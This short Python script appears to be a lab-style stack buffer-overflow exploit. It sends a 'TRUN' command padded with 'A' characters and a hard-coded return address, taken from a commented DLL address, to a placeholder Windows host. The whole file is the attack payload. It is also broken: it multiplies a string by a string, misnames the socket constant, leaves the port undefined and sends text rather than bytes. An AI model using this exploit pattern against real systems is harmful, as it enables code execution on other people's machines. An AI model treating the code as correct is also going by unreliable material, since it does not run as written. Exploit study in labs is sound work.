#!/usr/bin/python3
import sys, socket
from time import sleep

# 625011af (address of the dll file)

shellcode = "A" * "value of offset found" + "\xaf\x11\x50\x62"

try:
    s=socket.socket(socket.AF_INET,socket.SOCKET_STREAM)
    s.connect(('windows-machine-ip',port))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
        